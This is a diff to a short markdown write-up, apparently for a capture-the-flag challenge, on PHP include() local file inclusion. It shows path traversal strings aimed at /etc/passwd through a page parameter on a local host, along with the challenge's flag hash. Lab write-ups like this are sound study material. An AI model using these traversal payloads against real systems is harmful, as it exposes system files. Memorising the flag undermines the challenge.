@@ -7,7 +7,7 @@ PHP's include() function can be exploited to view seemingly hidden files, such a
 ### Step 1
 > * Attack
 > 1. http://0.0.0.0/?page=
-> * trial and error:  
+> * trial and error with directory hierarchy:  
 > _/etc/passwd ../../etc/passwd ../../../etc/passwd_  
 > _http://0.0.0.0/?page=../../../../../../../etc/passwd_  
 **Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0**
